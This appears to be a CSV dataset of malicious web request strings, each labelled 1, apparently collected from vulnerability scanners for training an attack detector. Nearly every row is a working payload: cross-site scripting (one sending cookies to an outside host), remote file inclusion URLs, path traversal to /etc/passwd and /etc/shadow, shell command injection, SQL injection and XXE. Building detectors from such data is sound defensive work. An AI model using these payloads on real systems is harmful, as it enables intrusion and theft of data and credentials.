code,status
xsstest,1
<!--[if]><script>javascript:alert(1)</script -->,1
/main.php?stuff='&uname >q97413885 #,1
/msadc/..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
/weq93ppb.exe?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/jsp2/jspx/simple/view_page?mv_arg=|cat /etc/passwd|,1
<HTML><BODY>,1
/newkprosubscription/,1
"/phpwebsite/index.php?module=search&sea_search_op=continue&pda_limit=10\""><script>alert('vulnerable')</script>",1
& sleep 0 && str=$(echo ERXFFG) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 ,1
"|echo CDHGHW$((46+6))$(echo CDHGHW)CDHGHW""",1
/script//ident/index.php?path_inc=http://192.168.202.118:8080/2aibfaczmac8?,1
/biblioteca/bib_save.php?CLASSPATH=XXpathXX,1
/jscript5/,1
"/hjdzm96v.fts?<meta http-equiv=set-cookie content=""testbyqe=7474"">",1
/wasdscripts172-axp/,1
 then sleep 0,1
<script/src=data:,1
" echo VKXTTD$((59+83))$(echo VKXTTD)VKXTTD""",1
/scriptcentral/,1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"";ls+-l;chmod+555+/tmp/rkejrxdjgj;""",1
/examples/jsp/checkbox/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; ,1
echo$IFSPQLHVF$((2+67))$(echo$IFSPQLHVF)PQLHVF\\,1
/latestvirusdescriptions/,1
%22| [ 6 -ne $(echo JUHLQP | tr -d '\n' | wc -c) ] || sleep 1 ,1
/zmvq66jy.idc?<script>cross_site_scripting.nasl</script>,1
/scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1
"<animation xlink:href=""javascript:alert(88)""/>",1
/main.php?stuff='rm q29765145 #,1
/phpmyadmin/index.php?action=login&languages[nessus]=syscp_1211.nasl&language=nessus&langs[nessus][0][file]=/etc/passwd,1
/scripts/search.scr.php?globals[pth][classes]=@rfiurl?globals[pth][classes]=@rfiurl?,1
/phpmyadmin/_mmserverscripts/mmhttpdb.php,1
/openview5.exe?target=main&action=../../../../../../../../../..//windows/win.ini,1
/scriptpath/index.php?page=http://192.168.202.96:8080/whmch8ftkt7kv?,1
<script>alert(1)</script> ,1
"/vhzmaia2.x?<meta http-equiv=set-cookie content=""testkogj=3979"">",1
);}print(`echo HXJYZZ,1
/config.inc.php3?rel_path=XXpathXX,1
"/?<script>document.cookie=""testxqrn=4654;""</script>",1
//../../../../../../../../windows/win.ini\x00en,1
/scripts/news.scr.php?globals[pth][classes]=http://192.168.202.118:8080/tzhfyzkbomspvm??,1
"/5qnlm5z2.jsp?<meta http-equiv=set-cookie content=""testsixi=8451"">",1
/examples/jsp/jsp2/el/admin.php?style=../../../../../../../../../../../../etc/passwd\x00,1
/examples/jsp/error/news/index.dot?id=../../../../../../../../../../../..//etc/passwd\x00.jpg,1
/admin/news.admin.php?path_to_script=http://192.168.202.118:8080/2aibfaczmac8??&cmd=ls,1
/authentication/phpbb3/phpbb3.functions.php?pConfig_auth[phpbb_path]=XXpathXX,1
/viewcvs.cgi/?cvsroot=<script>foo</script>,1
/top.php?stuff=ping;-w;10000;-n;1;1.2.3.4&rem;,1
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ?",1
 str1=${#str},1
"/help.php?q=""|ping;-w;9000;-n;1;1.2.3.4|rem;",1
'||echo QZICOQ$((45+93))$(echo QZICOQ)QZICOQ//,1
"/rpxyx07v.nsf?<script>document.cookie=""testbnli=1975;""</script>",1
|echo$IFSLCSZUM$((46+15))$(echo$IFSLCSZUM)LCSZUM,1
/javascript/sign.exe,1
/module/forum/forum.php?fd=http://192.168.202.96:8080/4dckqcc0acprbz?=';,1
 else sleep 1,1
/javascript/insert.exe,1
/examples/jsp/checkbox/search.php?submit=true&search=');,1
"/demo/ms-pe02/catalog.php?cid=0&main=@rfiurl&pagenumber=1&sid='""&sortfield=title&sortorder=asc",1
/urlinn_includes/config.php?dir_ws=XXpathXX?,1
<marquee<marquee/onstart=confirm(2)>/onstart=confirm(1),1
/%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE},1
/scgi-bin/fileseek.cgi?foot=&head=;cat /etc/passwd|,1
 fi |,1
';echo$IFSXZROZE$((34+62))$(echo$IFSXZROZE)XZROZE',1
/examples/jsp/jsp2/el/plugins/safehtml/htmlsax3.php?dir[plugins]=/etc/passwd\x00,1
"/admin/index.php?msg=1&username=""><script>alert(410686083385)</script><""",1
"/main.php?logout=""\x0ddel q69325217 #",1
/_theme/breadcrumb.php?rootBase=XXpathXX,1
";echo HIENCF$((0+66))$(echo HIENCF)HIENCF
&echo IBIYQC$((4+38))$(echo IBIYQC)IBIYQC",1
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
%27& sleep 0 && str=$(echo XDAIBC) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 %7C,1
"/u95h6ymu.pl?<meta http-equiv=set-cookie content=""testkhwc=4028"">",1
%22& sleep 0 && str=$(echo YBJQLF) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 \\,1
/help.php?q='rm\x09q19574333\x09#,1
 str=$(echo TYPSKV),1
"/help.php?q=""&rm",1
"--></style></script><script>0x94(0x000123)<
'\--></style></script><script>alert(0x000123)</script>",1
"/help.php?q=""&rm q31935143&rem ",1
@,1
/ny1b3qq4.jspa?<script>cross_site_scripting.nasl</script>,1
"/1qwv2p5p.php3?<meta http-equiv=set-cookie content=""testvqcy=252"">",1
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",1
 else sleep 1,1
%27| [ 4 -ne $(echo NWPDIX | tr -d '\n' | wc -c) ] || sleep 1 #,1
"<iframe src=""404"" onload=""top.frames[0].document.write(&quot;<script>r=new XMLHttpRequest();r.open('GET'",1
 fi ,1
"/top.php?stuff=""sleep\x0910\x09#",1
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},1
/subscriptions.dump,1
"/7o5qp766.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/<script>document.cookie=""testylik=3403;""</script>",1
|echo RQGHQR$((90+57))$(echo RQGHQR)RQGHQR|,1
/40;15531244/,1
 fi ',1
/typoscript-f35/,1
& sleep 0 && str=$(echo FAGBBN) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 %7C,1
/prescription-soma/,1
/scripts/lom_update.php?etcdir=http://192.168.202.118:8080/ghl9il?,1
/viart_cms-3.3.2/blocks/block_site_map.php?root_folder_path=XXpathXX?,1
<script ~~~>confirm(0%0)</script ~~~>,1
/acunetixxsshy6/,1
echo OQDPSL$((47+24))$(echo OQDPSL)OQDPSL,1
/main.php?stuff=|ping;-w;9000;-n;1;4.3.2.1|rem;,1
/examples/jsp/jsp2/jspx/detail.asp?nchannel='1,1
/scripts/mundimail/template/simpledefault/admin/_masterlayout.php?top=http://192.168.202.96:8080/4dckqcc0acprbz?,1
 then sleep 0,1
 then sleep 0,1
1,1
 then sleep 0,1
/weq93ppb.jsp?<script>cross_site_scripting.nasl</script>,1
| [ 8 -ne $(echo MMQKSR | tr -d '\n' | wc -c) ] || sleep 1 &,1
"<table background=""javascript:alert(1)""></table>",1
/phpmyadmin/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331904220&lang_crm=../../vtigerservice.php\x00,1
/javascript/build.exe,1
"/index.php?in=song&term=<script>alert(""411756083444"");</script>&action=search&start=0",1
/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331908785&lang_crm=../../vtigerservice.php\x00,1
"/vwmg565s.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/jsp2/jspx/pollit/poll_it_ssi_v2.0.cgi?data_dir=/etc/passwd\x00,1
/en-us/account/popup.php?include_path=/etc/passwd\x00,1
'||echo NCRWHM$((61+27))$(echo NCRWHM)NCRWHM&,1
echo FXJFMZ$((67+82))$(echo FXJFMZ)FXJFMZ|,1
"/l13b77e5.asp?<script>document.cookie=""testjvvf=7721;""</script>",1
/javascript/theme.exe,1
%27,1
 then sleep 0,1
)print(`echo PUEXZN`.`echo $((11+4))`.`echo PUEXZN`.`echo PUEXZN`);//PUEXZN,1
/subscriptions.trace,1
/javascript/head.exe,1
"/u8yiqilu.php?<script>document.cookie=""testswjp=6010;""</script>",1
 str1=${#str},1
"<div>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//",1
"/top.php?stuff=""\x0adel\x09q69986769\x09#",1
/m5103snj.jsp?<script>cross_site_scripting.nasl</script>,1
 then sleep 0,1
| [ 2 -ne $(echo LQRKBX | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,1
'& sleep 0 && str=$(echo ERQGRV) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %22,1
%22,1
'& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 ,1
/examples/jsp/num/include/monitoring/engine/makexml.php?fileoreonconf=/etc/passwd\x00,1
=,1
"/examples/jsp/jsp2/el/forumdisplay.php?fid=21""><script>x</script>",1
echo$IFSEMHHKB$((6+28))$(echo$IFSEMHHKB)EMHHKB,1
 fi %22,1
<!-- Up to Opera 12.x -->,1
'&&echo$IFSEEAOWX$((31+37))$(echo$IFSEEAOWX)EEAOWX\\,1
"%22| [ 1 -ne $(echo XHMATL | tr -d '\n' | wc -c) ] || sleep 1 """,1
"|echo JZTYDR$((14+40))$(echo JZTYDR)JZTYDR'
||echo BOMIAP$((85+40))$(echo BOMIAP)BOMIAP'",1
/help.php?q=ver >q77858339&rem ,1
/cgi-bin/visitor.exe,1
/javascript/select.exe,1
"/main.php?logout=""\x0adel\x09q43175153\x09#",1
/scripts/directorypro.cgi?want=showcat&show=../../../../../etc/passwd\x00,1
/examples/jsp/error/detail.asp?nchannel='1,1
 fi %22,1
/dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth=XXpathXX?,1
/scripts/subsystems/permissions.info.php,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
"<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM ""file:///etc/passwd"">",1
 str=$(echo IFIPTC),1
/javascript/checkout.exe,1
"/main.php?stuff="";rm\x09q87779896\x09#",1
"/j4rdyhw8.cgi?<script>document.cookie=""testrluj=1420;""</script>",1
<svg/onload=setTimeout`alert\`1\``>,1
/examples/jsp/cal/starnet/modules/sn_allbum/slideshow.php?cmsdir=/etc/passwd\x00,1
' or 1=1,1
<object data=data:text/html;base64,1
"| [ 5 -ne $(echo VNALZQ | tr -d '\n' | wc -c) ] || sleep 1 """,1
onMouseUp=wi&#110dow[Str&#105;ng.fromC&#104;arCode(501-404,1
"/manager/search.jsp?q=%""<script>alert(1331904374)</script>",1
&#x000003E,1
/includes/functions_mod_user.php?phpbb_root_path=XXpathXX?,1
' or 1 in (@@version)--,1
&#x00003c;,1
 then sleep 0,1
"/l13b77e5.cfm?<meta http-equiv=set-cookie content=""testjvvf=7721"">",1
/examples/jsp/cal/lib/dbman_filter.inc.php?lib_path=/etc/passwd\x00,1
/cms/meetweb/classes/ManagerRightsResource.class.php?root_path=XXpathXX,1
"/ju0u7kfo.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/checkbox/htsearch?exclude=`/etc/passwd`,1
/javascript/example.exe,1
"/top.php?stuff=""|ping\x0b-w\x0b10000\x0b-n\x0b1\x0b4.3.2.1|rem\x0b",1
echo PFJGQM,1
/scripts/ylrvly9nh_pf.sh,1
"<script>document.cookie=""testqppc=8767;""</script>",1
"/yef5f3d5.cgi?<meta http-equiv=set-cookie content=""testcrcv=6167"">",1
"/main.php?stuff=""del\x0bq47639929&rem\x0b",1
"<div/style=""width:expression(confirm(1))"">X</div>",1
${passthru(print(`echo DAORGO`.`echo $((65+75))`.`echo DAORGO`.`echo DAORGO`))}DAORGO,1
"<!-- IE 5-8 standards mode --><a href=http://foo.bar/#x=`y></a><img alt=""`><img src=xx:x onerror=alert(1)></a>""><!-- IE 5-9 standards mode --><!a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(2)//""><?a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(3)//"">",1
"/7uz3ok60.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/ht8pn8uq.exe?<script>cross_site_scripting.nasl</script>,1
"/x7pclv4s.html?<meta http-equiv=set-cookie content=""testiulz=3709"">",1
& sleep 0 && str=$(echo HMZJIQ) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 |,1
<isindex/autofocus/onfocus=alert()>,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},1
"/l13b77e5.jsp?<script>document.cookie=""testjvvf=7721;""</script>",1
%22; str=$(echo AVKIFD); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,1
 else sleep 1,1
 str=$(echo GNKPOL),1
/includes/lib-template-mod.inc.php?CONF_CONFIG_PATH=XXpathXX?,1
& sleep 0 && str=$(echo CQWURN) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 #,1
/javascript/~bin.exe,1
 if [ 1 -ne ${str1} ],1
/superscript/,1
<!--[if]><script>alert(1)</script --><!--[if<img src=x onerror=alert(2)//]> -->,1
/cgi-perl/view_item?html_file=../../../../../../../../../../etc/passwd\x00,1
"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;XSS&lt;/A&gt;",1
"/examples/jsp/num/index.php?mod_id=2&kb_ask=</textarea><script>alert(""cerberus_support_center_mult_flaws.nasl"")</script>",1
'&echo SCIQBL$((85+51))$(echo SCIQBL)SCIQBL\\,1
& sleep 0 && str=$(echo UGGXTG) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 ',1
<img src=a onerror=setInterval(String['fromCharCode'](97,1
/dda2qr7j.dll?<script>cross_site_scripting.nasl</script>,1
/javascript/.passwd.so,1
"/byrg33fw.mscgi?<meta http-equiv=set-cookie content=""testexuu=5340"">",1
"& sleep 0 && str=$(echo RIIZGU) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 '
& sleep 0 && str=$(echo RIIZGU) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 '",1
/scripts/login.php?return=http://www.nessus.org/,1
"/bn857frh.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"<meta http-equiv=set-cookie content=""testhvje=9403"">",1
"<div style=""list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"">X",1
/main.php?stuff=&ver;>q39916466&rem;,1
%27| [ 4 -ne $(echo HYWCTJ | tr -d '\n' | wc -c) ] || sleep 1 //,1
/post.asp?method=topic&forum_id=1&cat_id=1&type=wvs-xss-magic-string-410025568136,1
<svg onload=1?alert(9):0>,1
%22& sleep 0 && str=$(echo JTLWWU) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 ,1
 if [ 5 -ne ${str1} ],1
"/h4bi26jd.exe?<script>document.cookie=""testhrzx=1150;""</script>",1
 fi %26,1
"/help.php?q="";sleep 9 #",1
%22; str=$(echo BUMBBO); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,1
<select onchange=alert(1)><option>1<option>2,1
/cgi-914/gw5/gwweb.exe?htmlver=aaa&get-context,1
"<meta charset=""x-mac-farsi"">Â¼script Â¾confirm(1)//Â¼/script Â¾",1
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
/main.php?stuff='uname\x09>q81291893\x09#,1
/taskdir.exe/,1
/eg2u8pbv.idc?<script>cross_site_scripting.nasl</script>,1
/scripts/vhost.php?action=logout&time=1332010201,1
..\..\..\..\..\..\windows\win.ini,1
/cgi-bin/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904404')</script>,1
 if [ 9 -ne ${str1} ],1
 then sleep 0,1
 str1=${#str},1
"'`""><\x00script>javascript:alert(1)</script>",1
;echo KGVZYK$((88+50))$(echo KGVZYK)KGVZYK,1
 str1=${#str},1
/subscription_new/,1
"onMouseDown=&#00097;&#000108;&#000101;&#000114;&#000116;&#00040;&#00039;&#00088;&#00083;&#00083;&#00039;&#00041;""",1
/javascript/document.ini,1
/main.php?frm_daynight=day&frm_passwd=&frm_referer=http://192.168.23.202/main.php?logout=1&frm_user=&scr_height=q58671721&scr_width=,1
/javascript/htpasswd.tar.bz2,1
"/3j8echh0.pl?<meta http-equiv=set-cookie content=""testfuqi=4189"">",1
"/help.php?q=""&ping",1
/recordings/index.php?search=<script>foo</script>,1
/en-us/<script>cross_site_scripting.nasl</script>.aspx,1
"/um7xpn15.cfm?<script>document.cookie=""testotoy=6142;""</script>",1
' echo KFJYWO$((38+75))$(echo KFJYWO)KFJYWO',1
/opensiteadmin/scripts/classes/databasemanager.php?path=http://192.168.202.96:8080/swgnhpydbq0t?\x00,1
/scripts/1331922077-ror_session_fixation.nasl,1
'+alert(0x000123)+',1
'&&echo BMIIJQ$((29+3))$(echo BMIIJQ)BMIIJQ&,1
"/j4drbkil.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+a+fa+>>esbq",1
;echo DDXENF$((29+82))$(echo DDXENF)DDXENF&,1
/cacti/scp.dll/sendto?template=../../../../../../../../../../../../boot.ini\x00gwextranet_template_dir_traversal.nasl,1
/fo564rei.dll?<script>cross_site_scripting.nasl</script>,1
"&echo CDFCWV$((36+22))$(echo CDFCWV)CDFCWV&
|echo LAHTXU$((26+18))$(echo LAHTXU)LAHTXU&",1
/include/default_header.php?script_path=http://192.168.202.96:8080/4dckqcc0acprbz?,1
<script>\u0061\u006C\u0065\u0072\u0074`1`</script> // ES6 Variation,1
 str=$(echo ECBRPQ),1
 then sleep 0,1
/main.php?stuff=&ver\xa0>q58155175&rem\xa0,1
" or 1=1 or ""=",1
/main.php?stuff=;uname\x09#,1
;echo$IFSWSRCRX$((45+83))$(echo$IFSWSRCRX)WSRCRX//,1
/manager/store.cgi?startid=../../../../../../../../../etc/passwd\x00.html,1
${popen(print(`echo KCHOPX\necho $((77+78))\necho KCHOPX\necho KCHOPX`);%252523KCHOPX,1
"<IMG SRC="" &#14;  javascript:confirm(document.location);"">",1
"/raanw4ia.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE},1
/scripts/mensajeitor.php,1
/cacti/showproduct.php?product=1',1
/l4fz1dqw.nsf?<script>cross_site_scripting.nasl</script>,1
 else sleep 1,1
'||echo SLVMKV$((96+0))$(echo SLVMKV)SLVMKV&,1
& sleep 0 && str=$(echo MATZOK) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 %2F%2F,1
"/if69ddo1.fts?<script>document.cookie=""testiabz=5220;""</script>",1
1##%1%2%3%' %L%I%M%I%T %1%,1
 else sleep 1,1
 then sleep 0,1
'& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 #,1
/examples/jsp/colors/mail.php?id='/**/union/**/select/**/1,1
"/addvip.php?msetstr[""progsdir""]=http://192.168.202.96:8080/no4ghqiguzhst?",1
 fi |,1
/examples/jsp/colors/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc,1
 fi %27,1
/cgi-win/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
&#X003E;,1
 fi \\,1
/scripts/editor/filemanager/connectors/php/upload.php?command=fileupload&type=file&currentfolder=/fckeditor_currentfolder_file_upload-1332010431.php.,1
"</svg>//[""'`-->]]>]</div>",1
/examples/jsp/jsp2/el/smpwservicescgi.exe,1
%27; str=$(echo ZEPYMS); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi ,1
/examples/jsp/error/cgiip.exe/wservice=wsbroker1/webutil/ping.p,1
/main.php?stuff=&ver,1
&#x03c;,1
/include/pear/ITX.php?basepath=XXpathXX?,1
"<script>document.write(""<img src=//xss.cx/"" + document.cookie + "">"")</script>",1
/examples/jsp/jsp2/el/sendcard.php?view=1&id='sendcard_sql.nasl,1
"/?<meta http-equiv=set-cookie content=""testzgnm=1183"">",1
" or 1=1 or ""=",1
/examples/jsp/cal/index.php?search=<script>alert('cmsimple_search_xss.nasl');</script>&function=search,1
; str=$(echo XSKPXU); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //,1
 str1=${#str},1
/yacs/scripts/update_trailer.php?context[path_to_root]=http://192.168.202.96:8080/4dckqcc0acprbz??,1
&#X000003C,1
/scripts/bveygnpo6hkw.cfm,1
"/7dbjwpw6.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
+onmouseover=window.location='http://localhost',1
"\"";alert('XSS');//",1
/examples/jsp/jsp2/el/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script,1
| [ 9 -ne $(echo QHEWVV | tr -d '\n' | wc -c) ] || sleep 1 #,1
 else sleep 1,1
"/search.jsp?q=%""<script>alert(1332008323)</script>",1
/main.php?stuff=&ver\x0c>q83537975&rem\x0c,1
 else sleep 1,1
'; str=$(echo NSANUP); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi ,1
"/uvazfs7p.php3?<script>document.cookie=""testwtbo=4831;""</script>",1
to_timestamp_tz,1
/cgi-bin/index.php?sensor_program=<script>alert('phpsysinfo_multiple_xss.nasl');</script>,1
/cgi-bin/index.php?show=/etc/passwd,1
"/igtf0zon.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scgi-bin/pfdispaly.cgi?../../../../../../../../../../etc/passwd,1
/javascript/~eric.exe,1
/fa8p8lr8.x?<script>cross_site_scripting.nasl</script>,1
/counter_script/,1
 fi %7C,1
"/main.php?stuff=""&del\x09q89486418&rem\x09",1
/examples/jsp/jsp2/jspx/index.php?id=urjhxcl19w',1
/cgi-local/cgiemail-1.4/cgicso?query=<script>alert('vulnerable')</script>,1
/components/com_artforms/assets/captcha/includes/captchaform/mp3captcha.php?mosConfig_absolute_path=XXpathXX,1
 str1=${#str},1
"/help.php?q=""&rm q86798622&rem ",1
; str=$(echo IBOOVB); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,1
"/main.php?stuff=""ping\xa0-w\xa011000\xa0-n\xa01\xa04.3.2.1|rem\xa0",1
[U+2028]prompt(1)[U+2028]-->,1
"& sleep 0 && str=$(echo VGAFPT) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 """,1
&&echo$IFSSGSOLC$((27+7))$(echo$IFSSGSOLC)SGSOLC&,1
"/en-us/ddoworrl.cgi?<meta http-equiv=set-cookie content=""testvlau=8517"">",1
"/raanw4ia.nsf?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/zoomstats/libs/dbmax/mysql.php?GLOBALS['lib']['db']['path']=XXpathXX?,1
' or 1 --',1
/examples/jsp/num/tinybrowser/upload.php?badfiles=1><script>alert('tinybrowser_multiple_xss.nasl')</script>,1
if(substring(USER(),1
/en-us/account/doc/index.php?s=/etc/passwd\x00,1
' or username like '%,1
 then sleep 0,1
/BsiliX_path]/files/mbox-action.php3?BSX_LIBDIR=XXpathXX,1
"<xml ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
"/help.php?q=""ping",1
1    union    select    abc    from    abc,1
"/main.php?logout=""ping\x0b-w\x0b9000\x0b-n\x0b1\x0b4.3.2.1|rem\x0b",1
/zmvq66jy.html?<script>cross_site_scripting.nasl</script>,1
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>",1
/examples/jsp/checkbox/lib/owl_api.php?xrms_file_root=../../../../../../../../../../../../etc/passwd\x00,1
/examples/jsp/jsp2/jspx/calendar_admin.pl?config=|cat /etc/passwd|,1
//.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\windows/win.ini,1
/nsn/..\util/ren.bas,1
ORDER BY 8-- ,1
/administrator/components/com_feederator/includes/tmsp/subscription.php?globals[mosconfig_absolute_path]=http://192.168.202.118:8080/zz5thkvtmlgl?,1
/main.php?logout=uname\x09>q57845343\x09#,1
/phpclassifieds/latestwap.php?url=<script>alert('vulnerable');</script>,1
"<DIV STYLE=""width: expression(confirm(5));"">",1
"/top.php?stuff=""|ping",1
/opensiteadmin/scripts/classes/loginmanager.php?path=http://cirt.net/rfiinc.txt?\x00,1
 fi |,1
; str=$(echo QIIKMD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,1
 fi //,1
');}print(`echo MMQDEE\necho $((77+28))\necho MMQDEE\necho MMQDEE`);%252523MMQDEE,1
/search_result.asp?category=all&keyword=sql_error411826083446'&mode=date,1
/javascript/addressbook.exe,1
/main.php?logout='\x0duname #,1
"`""'><img src=xxx:x \x20onerror=javascript:alert(1)>",1
"/<meta http-equiv=set-cookie content=""testtbbe=856"">",1
"/help.php?q=""&ping\x09-w\x097000\x09-n\x091\x094.3.2.1&rem\x09",1
/scripts/shop.plx/page=nessus254998334,1
/fa8p8lr8.html?<script>cross_site_scripting.nasl</script>,1
"<img class=""emoji"" alt=""😯"" src=""x"" /><svg onload=prompt(document.domain)>",1
"; str=$(echo BAQATA); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C
; str=$(echo BAQATA); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C",1
"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",1
"/xsqln7eb.x?<meta http-equiv=set-cookie content=""testpcbb=9254"">",1
'echo$IFSEOXXHA$((67+86))$(echo$IFSEOXXHA)EOXXHA',1
"/main.php?logout=""del q68212743 #",1
&#0000062,1
"/en-us/s7qus4g3.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/jscript.php?my_ms[root]=http://cirt.net/rfiinc.txt??,1
/pythonscriptforparsingurlconf/,1
/examples/jsp/colors/index.php?action=view&filename=../../../../../../../../../../../../../etc/passwd,1
${system(print(`echo EDIEDW,1
/n9xlumt5.fts?<script>cross_site_scripting.nasl</script>,1
/javascript/webwork.exe,1
 str1=${#str},1
 fi %5C%5C,1
/web/BetaBlockModules/EditProfileModule/external.php?path_prefix=XXpathXX,1
/nyjgaorz.nsf?<script>cross_site_scripting.nasl</script>,1
/scripts/wxrdqnkjuwmu.pl,1
/javascript/null.exe,1
'&echo$IFSUNGUOC$((43+21))$(echo$IFSUNGUOC)UNGUOC\\,1
& sleep 0 && str=$(echo JHKWGE) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %27,1
/scripts/faq.php?action=&type=view&s=&id=-1' union select 0,1
<script>Object.defineProperty(window,1
